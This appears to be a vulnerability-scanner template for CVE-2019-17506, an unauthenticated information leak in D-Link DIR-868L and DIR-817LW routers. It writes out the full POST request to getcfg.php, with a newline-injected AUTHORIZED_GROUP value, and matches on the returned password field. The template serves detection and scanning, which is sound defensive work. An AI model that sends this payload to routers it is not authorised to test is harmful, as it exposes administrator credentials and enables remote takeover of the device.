id: CVE-2019-17506
info:
  author: pikpikcu
  description: There are some web interfaces without authentication requirements on
    D-Link DIR-868L B1-2.03 and DIR-817LW A1-1.04 routers. An attacker can get the
    router's username and password (and other information) via a DEVICE.ACCOUNT value
    for SERVICES in conjunction with AUTHORIZED_GROUP=1%0a to getcfg.php. This could
    be used to control the router remotely.
  name: DLINK DIR-868L & DIR-817LW Info Leak
  reference: https://github.com/dahua966/Routers-vuls/blob/master/DIR-868/name%26passwd.py
  severity: critical
  tags: cve,cve2019,dlink
requests:
- body: 'SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a

    '
  headers:
    Content-Type: text/xml
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - </password>
    - DEVICE.ACCOUNT
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/getcfg.php'
